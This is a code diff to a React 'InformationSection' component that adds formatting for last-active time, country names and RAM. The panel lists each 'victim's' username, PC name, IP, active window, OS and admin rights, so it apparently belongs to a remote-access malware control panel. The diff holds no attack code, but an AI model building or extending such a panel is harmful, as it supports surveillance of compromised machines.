@@ -5,6 +5,9 @@ import { useEffect, useRef } from "react";
 import { useQueryClient } from "@tanstack/react-query";
 
 import type { Victim } from "../../../api/victims";
+import { formatTime, getLastActiveMs } from "../../utils/victim-status";
+import { countryCodeToName } from "../../utils/country-names";
+import { formatRam } from "../../utils/format-ram";
 
 function Row(props: { label: string; value: string }) {
    const { label, value } = props;
@@ -21,6 +24,12 @@ function getExtra(victim: Victim | null, key: string): string {
    const v = (victim as Record<string, unknown>)[key];
    if (v == null) return "";
    return String(v);
+}
+
+function fmtLastActive(victim: Victim | null): string {
+   if (!victim) return "";
+   const ms = getLastActiveMs(victim);
+   return ms ? formatTime(ms) : "";
 }
 
 export function InformationSection(props: { victim: Victim | null }) {
@@ -85,14 +94,14 @@ export function InformationSection(props: { victim: Victim | null }) {
                <Row label="Username:" value={victim?.user ?? ""} />
                <Row label="PC-name:" value={victim?.hostname ?? ""} />
                <Row label="Ip:" value={victim?.ip ?? ""} />
-               <Row label="Location:" value={victim?.country ?? ""} />
+               <Row label="Location:" value={countryCodeToName(victim?.country)} />
                <Row label="Active window:" value={victim?.window ?? ""} />
                <Row label="System:" value={victim?.os ?? ""} />
-               <Row label="Last active:" value={String(victim?.last_active ?? "")} />
+               <Row label="Last active:" value={fmtLastActive(victim)} />
                <Row label="Admin rights:" value={victim?.admin ? "True" : "False"} />
                <Row label="CPU:" value={victim?.cpu ?? ""} />
                <Row label="GPU:" value={victim?.gpu ?? ""} />
-               <Row label="Ram:" value={victim?.ram ?? ""} />
+               <Row label="Ram:" value={formatRam(victim?.ram)} />
                <Row label="Comment:" value={victim?.comment ?? ""} />
             </div>
 
